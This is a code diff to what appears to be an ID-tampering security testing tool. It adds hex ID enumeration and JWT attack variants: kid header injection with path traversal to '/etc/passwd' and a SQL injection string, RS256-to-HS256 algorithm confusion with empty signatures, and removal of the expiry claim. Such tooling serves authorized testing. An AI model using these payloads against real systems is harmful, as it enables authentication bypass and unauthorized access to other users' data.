@@ -46,6 +46,9 @@ _RE_INTEGER   = re.compile(r'^\d+$')
 # Snowflake: 17-19 digit integer in Twitter/Discord epoch range
 _RE_SNOWFLAKE = re.compile(r'^\d{17,19}$')
 
+# Short hex strings: 2-16 hex chars (must contain ≥1 a-f to differ from plain integer)
+_RE_HEX       = re.compile(r'^[0-9a-f]{2,16}$', re.IGNORECASE)
+
 # Base64 (standard or URL-safe), padding optional
 _RE_BASE64    = re.compile(r'^[A-Za-z0-9+/\-_]+=*$')
 
@@ -90,12 +93,16 @@ def detect_id_type(value: str) -> IDType:
   if _RE_INTEGER.match(v):
     return IDType.INTEGER
 
+  # Short hex string (at least one a-f distinguishes from pure integer)
+  if _RE_HEX.match(v) and re.search(r'[a-f]', v, re.IGNORECASE):
+    return IDType.HEX
+
   # Slug
   if _RE_SLUG.match(v):
     return IDType.SLUG
 
-  # Base64 (must be at least 8 chars to avoid false positives on short words)
-  if len(v) >= 8 and _RE_BASE64.match(v):
+  # Base64: require at least one non-alpha char to avoid matching English words
+  if len(v) >= 8 and _RE_BASE64.match(v) and re.search(r'[0-9+/=\-_]', v):
     if _is_valid_base64(v):
       return IDType.BASE64
 
@@ -176,6 +183,9 @@ def generate_candidates(
 
   elif id_type in (IDType.HASH_MD5, IDType.HASH_SHA1, IDType.HASH_SHA256):
     candidates.extend(_hash_candidates(value, id_type))
+
+  elif id_type == IDType.HEX:
+    candidates.extend(_hex_candidates(value, count))
 
   elif id_type == IDType.SNOWFLAKE:
     candidates.extend(_snowflake_candidates(value, count))
@@ -394,6 +404,45 @@ def _jwt_candidates(value: str) -> List[TamperCandidate]:
       ))
       break
 
+  # 4. kid (Key ID) injection — path traversal + SQL injection variants
+  if 'kid' in header:
+    for kid_val in [
+      "../../dev/null",
+      "../../../../etc/passwd",
+      "' OR '1'='1",
+      "0",
+    ]:
+      new_header       = dict(header)
+      new_header['kid'] = kid_val
+      new_h = _b64_encode(_json.dumps(new_header, separators=(',', ':')).encode())
+      results.append(TamperCandidate(
+        f"{new_h}.{parts[1]}.{parts[2]}",
+        f"JWT kid injection: {kid_val!r} (original sig)",
+      ))
+      results.append(TamperCandidate(
+        f"{new_h}.{parts[1]}.",
+        f"JWT kid injection: {kid_val!r} (empty sig)",
+      ))
+
+  # 5. RS256→HS256 algorithm confusion (sign-check bypass)
+  if header.get('alg', '').upper() == 'RS256':
+    conf_header = dict(header)
+    conf_header['alg'] = 'HS256'
+    new_h = _b64_encode(_json.dumps(conf_header, separators=(',', ':')).encode())
+    results.append(TamperCandidate(
+      f"{new_h}.{parts[1]}.",
+      "JWT RS256→HS256 algorithm confusion (empty sig)",
+    ))
+
+  # 6. Remove exp claim — bypass expiry validation
+  if 'exp' in payload:
+    no_exp = {k: v for k, v in payload.items() if k != 'exp'}
+    new_p  = _b64_encode(_json.dumps(no_exp, separators=(',', ':')).encode())
+    results.append(TamperCandidate(
+      f"{parts[0]}.{new_p}.",
+      "JWT exp claim removed (empty sig)",
+    ))
+
   return results
 
 
@@ -453,6 +502,27 @@ def _slug_candidates(value: str) -> List[TamperCandidate]:
   # Try known admin slugs
   for s in ['admin', 'administrator', 'root', 'test', 'demo']:
     results.append(TamperCandidate(s, f"slug override: {s!r}"))
+  return results
+
+
+def _hex_candidates(value: str, count: int) -> List[TamperCandidate]:
+  try:
+    n = int(value, 16)
+  except ValueError:
+    return []
+  lower = value.lower() == value
+
+  def _fmt(i: int) -> str:
+    h = hex(i)[2:]
+    return h if lower else h.upper()
+
+  results = []
+  for delta in range(1, min(count // 2 + 1, 10)):
+    results.append(TamperCandidate(_fmt(n + delta), f"hex +{delta}"))
+    if n - delta > 0:
+      results.append(TamperCandidate(_fmt(n - delta), f"hex -{delta}"))
+  results.append(TamperCandidate("1", "hex 1"))
+  results.append(TamperCandidate("0", "hex zero"))
   return results
 
 
